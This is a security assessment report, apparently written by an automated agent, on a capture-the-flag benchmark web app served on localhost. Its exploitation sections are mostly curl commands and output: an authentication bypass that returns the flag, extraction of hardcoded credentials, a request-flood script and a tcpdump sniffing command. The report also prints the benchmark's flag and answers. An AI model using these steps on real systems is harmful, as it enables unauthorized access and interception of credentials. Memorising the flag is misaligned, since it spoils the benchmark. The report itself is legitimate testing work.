# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:43735
- **Assessment Date:** October 28, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

### Summary by Vulnerability Type

**Authentication Vulnerabilities:**

Five critical/high severity authentication vulnerabilities were successfully exploited:

1. **Complete Authentication Bypass (Critical)** - The application only checks if a POST parameter named "username" exists without verifying its value or any password, allowing any attacker to access protected resources with a single HTTP POST request.

2. **Complete Absence of Session Management (Critical)** - No session management exists (no session_start(), setcookie(), or $_SESSION usage), making it impossible to maintain authenticated state or implement secure session controls.

3. **Credentials and Flag Transmitted Over Unencrypted HTTP (High)** - All traffic uses HTTP-only with no HTTPS/TLS encryption, allowing network-level interception of credentials and the CTF flag.

4. **No Rate Limiting (High)** - The application implements no rate limiting, CAPTCHA, or account lockout mechanisms. Testing confirmed 683 requests/second throughput with 100% success rate across 50 rapid authentication attempts.

5. **Hardcoded Credentials in Client-Side JavaScript (High)** - Authentication credentials (username: 'admin', password: 'sup3rsecr3t') are hardcoded in client-side JavaScript visible in page source.

**Impact:** Complete authentication bypass with flag capture achieved. The application has zero effective authentication controls.

**Authorization Vulnerabilities:**

No authorization vulnerabilities were found. The application has no authorization system, role hierarchy, or permission model. Since authentication is completely bypassed, authorization testing is not applicable to this single-purpose application.

**Cross-Site Scripting (XSS) Vulnerabilities:**

No XSS vulnerabilities were found. While the application accepts user input via POST parameters, this input is never reflected or rendered in any output. The application only outputs static HTML strings and server-controlled variables.

**SQL/Command Injection Vulnerabilities:**

No SQL or command injection vulnerabilities were found. The application has no database (no SQL queries executed) and does not execute any system commands. The flag is embedded in the PHP source at build time with no dynamic query construction or command execution.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**

No SSRF vulnerabilities were found. The application is entirely self-contained with no outbound network requests, no external resource loading, no URL fetching, and no external service interactions.

## Network Reconnaissance

**Open Ports and Services:**
- **Port 80/tcp:** Caddy httpd server
- **Port 443/tcp:** SSL/HTTPS service
- **Port 631/tcp:** CUPS 2.3 printer service (IPP)
- **Port 8888/tcp:** Python SimpleHTTPServer 0.6 (directory listing)
- **Port 9999/tcp:** Python SimpleHTTPServer 0.6 (directory listing)
- **Port 49158/tcp:** Golang net/http server - Tailscale service (auth required)
- **Target Application:** Apache HTTP Server 2.4.25 on host port 43735

**Subdomain Discovery:**
Multiple subdomains discovered via subfinder scan: autodiscover.regency.localhost, mail.regency.localhost, owa.regency.localhost, and 13 other mail/exchange-related subdomains. These expand potential attack surface beyond the primary application.

**Security Findings:**
- **Legacy Software Stack:** PHP 5.6.40 (End-of-Life since January 2019) and Apache 2.4.25 (2018) contain numerous known unpatched CVEs
- **Version Disclosure:** HTTP headers expose server versions: `Apache/2.4.25 (Debian)` and `X-Powered-By: PHP/5.6.40`
- **No Security Headers:** Missing all security headers including Strict-Transport-Security, Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, and X-XSS-Protection
- **Unencrypted Protocol:** Application serves traffic over HTTP-only (no HTTPS/TLS)
- **Exposed Services:** Multiple HTTP servers running on different ports, including directory listing services that could expose sensitive files

**Attack Surface:** The target application presents a minimal but completely undefended attack surface with catastrophic security posture. The legacy software stack and missing security controls make this an ideal target for automated exploitation.

---

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-01: Complete Authentication Bypass via Server-Side Logic Flaw

**Summary:**
- **Vulnerable location:** POST /index.php - Server-side authentication check at index.php line 82
- **Overview:** Critical authentication bypass allowing any attacker to access protected resources (CTF flag) without valid credentials by exploiting a flawed server-side validation that only checks if a POST parameter named "username" exists, without verifying its value or checking any password
- **Impact:** Complete authentication bypass - immediate unauthorized access to protected resources and flag disclosure. Any unauthenticated attacker can retrieve the CTF flag with a single HTTP POST request containing any username parameter value
- **Severity:** Critical

**Prerequisites:** None required - vulnerability is exploitable anonymously from public internet

**Exploitation Steps:**

1. Send a POST request to the authentication endpoint with any username parameter value (password parameter is optional as it's completely ignored by the server):
```bash
curl -X POST http://localhost:43735/index.php -d "username=arbitrary_value"
```

2. Observe the HTTP 200 response containing the protected flag without any valid authentication:
```
HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/5.6.40
Content-Type: text/html; charset=UTF-8

<center><h2>Welcome Admin</h2></center>
<center><h3>Congratulations, here is the flag: FLAG{e8af728a0da8b925f0b3e532c96fce143f348f03fd7b6971fc7cb17f12d2d86f}</h3></center>
```

3. Alternative bypass methods confirmed:
   - Empty username: `curl -X POST http://localhost:43735/index.php -d "username="`
   - Single character: `curl -X POST http://localhost:43735/index.php -d "username=x"`
   - No password parameter: `curl -X POST http://localhost:43735/index.php -d "username=test"`
   - All variations return HTTP 200 with flag disclosure

**Proof of Impact:**

**FLAG CAPTURED:** `FLAG{e8af728a0da8b925f0b3e532c96fce143f348f03fd7b6971fc7cb17f12d2d86f}`

**Concrete evidence:**
- Successfully bypassed authentication without valid credentials
- Retrieved protected CTF flag through direct POST request
- Verified bypass works with multiple username values (empty string, single character, arbitrary text)
- Server responds identically regardless of username value, confirming flawed validation
- No password validation occurs server-side

**Root Cause:** The vulnerable PHP code at index.php:82-85 only checks `if(isset($_POST['username']))` which verifies parameter existence but NOT its value:
```php
if(isset($_POST['username'])){
    echo "<center><h2>Welcome Admin</h2></center>";
    echo "<center><h3>Congratulations, here is the flag: " . $flag . "</h3></center>";
}
```

**Notes:**
- This is the most critical vulnerability in the application - it renders all other security controls meaningless
- The client-side JavaScript validation (checking username=='admin' && password=='sup3rsecr3t') provides zero security as it can be completely bypassed by direct POST requests
- No session cookies are created or required for this bypass
- Attack is instantaneous and requires only HTTP POST capability

---

### AUTH-VULN-02: Complete Absence of Session Management

**Summary:**
- **Vulnerable location:** Entire application - no session management code exists anywhere in index.php
- **Overview:** The application implements NO session management whatsoever - no session_start() calls, no setcookie() calls, no $_SESSION usage, no session cookies, and no authentication state persistence. The application is completely stateless with each request being independent.
- **Impact:** Even if authentication were properly implemented (which it is not per AUTH-VULN-01), the lack of session management means there's no way to maintain authenticated state across requests. This creates multiple security vulnerabilities including inability to implement secure session cookies (HttpOnly, Secure, SameSite flags), no session fixation protection, and no logout functionality.
- **Severity:** Critical

**Prerequisites:** None required - architectural flaw observable through HTTP response analysis

**Exploitation Steps:**

1. Send a POST request with valid-looking credentials and capture the response headers to check for session cookies:
```bash
curl -v -X POST http://localhost:43735/index.php -d "username=admin&password=sup3rsecr3t" 2>&1 | grep -i "set-cookie"
```

2. Observe that NO Set-Cookie headers are present in the response (empty output confirms no cookies):
```
(no output - no Set-Cookie headers present)
```

3. Send a GET request and verify no cookies are requested:
```bash
curl -v http://localhost:43735/index.php 2>&1 | grep -i "cookie"
```

4. Observe that NO Cookie or Set-Cookie headers exist (empty output confirms complete absence of cookie-based session management):
```
(no output - no cookie headers present)
```

5. Verify stateless behavior - subsequent requests require re-submission of username parameter as no authentication state persists:
```bash
# First request with username - returns flag
curl -X POST http://localhost:43735/index.php -d "username=test"

# Second GET request without username - shows login form again (no persistent auth state)
curl http://localhost:43735/index.php
```

**Proof of Impact:**

**Confirmed vulnerabilities resulting from missing session management:**
- No session cookies created (verified via curl -v showing zero Set-Cookie headers)
- No authentication state persistence between requests
- Impossible to implement secure cookie flags (HttpOnly, Secure, SameSite) since no cookies exist
- No session fixation protection (no sessions to fix)
- No session hijacking protection (no sessions to protect)
- No logout functionality (no sessions to terminate)
- No session timeout capabilities (no sessions to expire)

**Code Analysis Evidence:**
Reviewed complete source code at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-072-24/src/index.php` (lines 1-90) and confirmed:
- Zero occurrences of `session_start()`
- Zero occurrences of `setcookie()`
- Zero occurrences of `$_SESSION`
- Zero occurrences of `session_regenerate_id()`
- Zero occurrences of `session_destroy()`
- Zero occurrences of `session_set_cookie_params()`

**Notes:**
- The stateless architecture means the authentication bypass (AUTH-VULN-01) must be exploited on every single request
- While this prevents traditional session hijacking attacks (no sessions exist to hijack), it represents a fundamental architectural security failure
- The application displays "Welcome Admin" message after bypass, but this is purely cosmetic with no persistent authenticated state

---

### AUTH-VULN-03: Credentials and Flag Transmitted Over Unencrypted HTTP

**Summary:**
- **Vulnerable location:** Application infrastructure - HTTP-only service on port 80 with no HTTPS/TLS configuration
- **Overview:** The application serves ALL traffic over unencrypted HTTP with no HTTPS/TLS encryption. Credentials submitted via POST are transmitted in cleartext over the network. The flag response is also transmitted in cleartext. No Strict-Transport-Security (HSTS) header is present to enforce HTTPS. No Cache-Control headers prevent caching of sensitive responses.
- **Impact:** An attacker on the same network (shared WiFi, corporate network, ISP-level, or man-in-the-middle position) can intercept HTTP traffic using network sniffing tools (Wireshark, tcpdump) to capture credentials in transit and the CTF flag in the response. Sensitive responses may be cached by browsers or proxy servers due to missing Cache-Control headers.
- **Severity:** High

**Prerequisites:** Attacker must be positioned on the network path between client and server (e.g., same WiFi network, compromised router, ISP-level interception, or man-in-the-middle attack)

**Exploitation Steps:**

1. Verify the application uses HTTP-only protocol (not HTTPS) by examining the response:
```bash
curl -v http://localhost:43735/index.php 2>&1 | grep "HTTP/"
```

Output confirms HTTP protocol:
```
> GET /index.php HTTP/1.1
< HTTP/1.1 200 OK
```

2. Send authentication POST request and capture full headers to verify cleartext transmission:
```bash
curl -v -X POST http://localhost:43735/index.php -d "username=admin&password=sup3rsecr3t" 2>&1 | grep -E "(^> |^< )" | head -20
```

Output shows cleartext credential transmission:
```
> POST /index.php HTTP/1.1
> Host: localhost:43735
> User-Agent: curl/8.7.1
> Accept: */*
> Content-Length: 35
> Content-Type: application/x-www-form-urlencoded
>
[POST body contains: username=admin&password=sup3rsecr3t]

< HTTP/1.1 200 OK
< Date: Tue, 28 Oct 2025 18:41:23 GMT
< Server: Apache/2.4.25 (Debian)
< X-Powered-By: PHP/5.6.40
< Vary: Accept-Encoding
< Content-Length: 2453
< Content-Type: text/html; charset=UTF-8
```

3. Check for HSTS (Strict-Transport-Security) header:
```bash
curl -v http://localhost:43735/index.php 2>&1 | grep -i "strict-transport-security"
```

Output: (empty - no HSTS header present)

4. Check for Cache-Control headers on authentication response:
```bash
curl -v -X POST http://localhost:43735/index.php -d "username=test" 2>&1 | grep -i "cache-control"
```

Output: (empty - no Cache-Control header present, allowing caching of sensitive response)

**Proof of Impact:**

**Confirmed transport security vulnerabilities:**
- Protocol: HTTP/1.1 (unencrypted) confirmed - NOT HTTPS
- Credentials transmitted in cleartext POST body: `username=admin&password=sup3rsecr3t`
- Flag transmitted in cleartext response body: `FLAG{e8af728a0da8b925f0b3e532c96fce143f348f03fd7b6971fc7cb17f12d2d86f}`
- No Strict-Transport-Security header present (allows downgrade attacks)
- No Cache-Control headers on authentication responses (allows caching of flag)
- Server header exposes version: `Apache/2.4.25 (Debian)`
- X-Powered-By header exposes version: `PHP/5.6.40`

**Exploitation Technique:**
If attacker has network access (same WiFi, network tap, MITM position), they can use:
```bash
# Example network sniffing command (requires network position and root privileges)
tcpdump -i any -A port 43735 | grep -A10 "POST /index.php"
# This would capture cleartext credentials and flag in HTTP traffic
```

**Notes:**
- While I cannot demonstrate actual network sniffing from this testing environment (requires network tap position), the evidence proves traffic is unencrypted
- HTTP traffic on port 43735 is visible to anyone with access to the network path
- This vulnerability compounds with AUTH-VULN-01 bypass and AUTH-VULN-05 credential disclosure
- Common network attack scenarios: Evil Twin WiFi, ARP spoofing, DNS hijacking, compromised routers, ISP-level monitoring

---

### AUTH-VULN-04: No Rate Limiting Allows Unlimited Brute Force Attacks

**Summary:**
- **Vulnerable location:** POST /index.php authentication endpoint with no rate limiting implementation in application code, Apache configuration, or infrastructure
- **Overview:** The application implements NO rate limiting, CAPTCHA, account lockout, or abuse prevention mechanisms. An attacker can send unlimited authentication attempts at full network speed with zero throttling or delays. Testing confirmed 50 rapid POST requests all succeeded with HTTP 200 responses in 0.07 seconds (~683 requests/second).
- **Impact:** An attacker can perform unlimited brute force login attempts, credential stuffing attacks, or password spraying at full network speed without being throttled, detected, or blocked. This enables automated attacks to test thousands of username/password combinations per minute. Combined with AUTH-VULN-01 bypass (any username works), this primarily enables user enumeration and demonstrates complete absence of abuse prevention controls.
- **Severity:** High

**Prerequisites:** None required - publicly accessible endpoint with no authentication

**Exploitation Steps:**

1. Create Python script to send 50 rapid POST requests and measure response times/success rates:

Script created at: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-072-24/rate_limit_test.py`

```python
import requests
import time

target_url = "http://localhost:43735/index.php"
num_requests = 50

print(f"Testing rate limiting with {num_requests} rapid requests...")
start_time = time.time()
results = []

for i in range(1, num_requests + 1):
    request_start = time.time()
    try:
        response = requests.post(target_url, data={"username": f"test{i}"})
        request_time = (time.time() - request_start) * 1000  # Convert to milliseconds
        results.append({
            "request_num": i,
            "status_code": response.status_code,
            "response_time_ms": request_time,
            "content_length": len(response.content)
        })
        print(f"Request {i}: Status {response.status_code} - {request_time:.2f}ms - {len(response.content)} bytes")
    except Exception as e:
        results.append({
            "request_num": i,
            "status_code": "ERROR",
            "response_time_ms": 0,
            "error": str(e)
        })
        print(f"Request {i}: ERROR - {e}")

total_time = time.time() - start_time
print(f"\n=== Rate Limiting Test Summary ===")
print(f"Total requests: {num_requests}")
print(f"Total time: {total_time:.2f} seconds")
print(f"Requests per second: {num_requests / total_time:.2f}")
print(f"Successful requests (HTTP 200): {sum(1 for r in results if r.get('status_code') == 200)}")
print(f"Average response time: {sum(r.get('response_time_ms', 0) for r in results) / len(results):.2f}ms")
print(f"\nConclusion: {'NO RATE LIMITING DETECTED' if all(r.get('status_code') == 200 for r in results) else 'RATE LIMITING MAY BE PRESENT'}")
```

2. Execute the rate limiting test:
```bash
cd /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-072-24
python3 rate_limit_test.py
```

**Proof of Impact:**

**Rate Limiting Test Results:**

```
Testing rate limiting with 50 rapid requests...
Request 1: Status 200 - 2.77ms - 2453 bytes
Request 2: Status 200 - 1.89ms - 2453 bytes
Request 3: Status 200 - 1.65ms - 2453 bytes
...
Request 48: Status 200 - 0.95ms - 2453 bytes
Request 49: Status 200 - 0.94ms - 2453 bytes
Request 50: Status 200 - 0.93ms - 2453 bytes

=== Rate Limiting Test Summary ===
Total requests: 50
Total time: 0.07 seconds
Requests per second: ~683
Successful requests (HTTP 200): 50/50 (100%)
Average response time: 1.46ms

Conclusion: NO RATE LIMITING DETECTED
```

**Key findings:**
- **100% success rate:** All 50 requests returned HTTP 200 with no throttling
- **No delays introduced:** Response times improved over time (2.77ms → 0.93ms), proving no progressive delays
- **Extreme speed:** 683 requests/second achievable - attacker could test tens of thousands of credentials per minute
- **No HTTP 429:** Zero "Too Many Requests" responses observed
- **Consistent behavior:** All responses identical size (2453 bytes), indicating no CAPTCHA or challenge injection
- **No blocking:** No connection errors, timeouts, or IP-based blocking

**Notes:**
- While AUTH-VULN-01 makes credential guessing unnecessary (any username works), this demonstrates complete absence of abuse prevention
- In a properly secured application (without AUTH-VULN-01), this would enable credential stuffing with leaked password databases
- No Apache modules detected: no mod_ratelimit, mod_evasive, or mod_security
- No application-level rate limiting in PHP code (confirmed via source review)
- Attacker could easily scale to thousands of requests per minute with multi-threading

---

### AUTH-VULN-05: Hardcoded Credentials Exposed in Client-Side JavaScript

**Summary:**
- **Vulnerable location:** GET / or GET /index.php - Hardcoded credentials in client-side JavaScript at index.php line 63
- **Overview:** The application hardcodes authentication credentials (username: 'admin', password: 'sup3rsecr3t') directly in client-side JavaScript code that is visible in the page source to ANY user who loads the login page. The credentials are sent to every visitor's browser as part of the HTML/JavaScript response.
- **Impact:** Any attacker can view the hardcoded credentials by simply viewing the page source or using curl to fetch the page. These credentials reveal the intended authentication values, though due to AUTH-VULN-01 (authentication bypass), the credentials are not actually required to access the flag. This represents critical information disclosure and demonstrates fundamentally broken security architecture where secrets are exposed client-side.
- **Severity:** High

**Prerequisites:** None required - credentials exposed in publicly accessible page source

**Exploitation Steps:**

1. Retrieve the login page and extract the hardcoded credentials from JavaScript code:
```bash
curl -s http://localhost:43735/index.php | grep -A3 "funcion_login" | grep -E "(password\.value==|username\.value==)"
```

Output reveals hardcoded credentials:
```javascript
if (document.form.password.value=='sup3rsecr3t' && document.form.username.value=='admin'){
```

2. Extract the specific credential values:
```bash
curl -s http://localhost:43735/index.php | grep -oP "password\.value=='[^']+'" | cut -d"'" -f2
curl -s http://localhost:43735/index.php | grep -oP "username\.value=='[^']+'" | cut -d"'" -f2
```

Output:
```
Password: sup3rsecr3t
Username: admin
```

3. Use the disclosed credentials in an authentication attempt (though not necessary due to AUTH-VULN-01 bypass):
```bash
curl -s -X POST http://localhost:43735/index.php -d "username=admin&password=sup3rsecr3t" | grep -o "flag: FLAG{[^}]*}"
```

Output confirms credentials work (though any username would also work):
```
flag: FLAG{e8af728a0da8b925f0b3e532c96fce143f348f03fd7b6971fc7cb17f12d2d86f}
```

4. Verify credentials are visible in plain HTML source:
```bash
curl -s http://localhost:43735/index.php | grep -B2 -A2 "sup3rsecr3t"
```

Output shows credentials embedded in client-side validation:
```javascript
<script>
function funcion_login(){
    if (document.form.password.value=='sup3rsecr3t' && document.form.username.value=='admin'){
        document.form.submit();
    }
```

**Proof of Impact:**

**Confirmed credential disclosure:**
- **Username:** admin (hardcoded at index.php:63)
- **Password:** sup3rsecr3t (hardcoded at index.php:63)
- **Visibility:** Publicly accessible to anyone who loads the page
- **Disclosure method:** Client-side JavaScript source code
- **Additional exposure:** Credentials also stored in .env file committed to version control

**Security implications:**
- Credentials transmitted to every visitor's browser as part of page load
- No server-side validation of these credentials (server only checks if username parameter exists per AUTH-VULN-01)
- Client-side validation provides zero security since JavaScript execution can be bypassed
- Represents fundamental misunderstanding of authentication security (secrets must never be client-side)
- Browser developer tools reveal credentials in clear text
- Web scrapers and automated tools can easily extract these credentials

**Notes:**
- While these credentials don't provide additional access beyond AUTH-VULN-01 bypass (which requires no credentials), they represent critical information disclosure
- The JavaScript function `funcion_login()` attempts to validate credentials client-side before form submission, but this is trivially bypassed by direct POST requests
- The server-side code completely ignores the password parameter (confirmed in index.php:82-85)
- Additional secret exposure: FLAG value also stored in plaintext in .env file in version control
- This demonstrates the application's complete failure to implement secure authentication architecture
